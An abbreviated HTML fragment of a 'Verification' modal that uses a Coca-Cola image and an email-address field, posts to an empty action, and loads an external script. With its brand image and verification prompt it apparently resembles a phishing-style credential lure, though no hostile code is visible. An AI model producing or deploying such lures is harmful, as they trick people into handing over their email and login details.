            ...
            <div class="modal-content">
                <div class="modal-body">
                    <div class="text-center">
                        <img src="/cocacola/intro.png" alt="Verification" class="img-fluid rounded">
						<div class="mt-4">
                        ...
                        <div class="mt-4">
                            <form action="" method="post" id="myform">
                                <div class="mb-3 shadow rounded">
                                    <input type="id" class="form-control up" name="firsname" placeholder="Email address" autocomplete="on" required="yes" maxlength="100">
                                </div>
...
<script src="/jellydrink/script.js"></script>
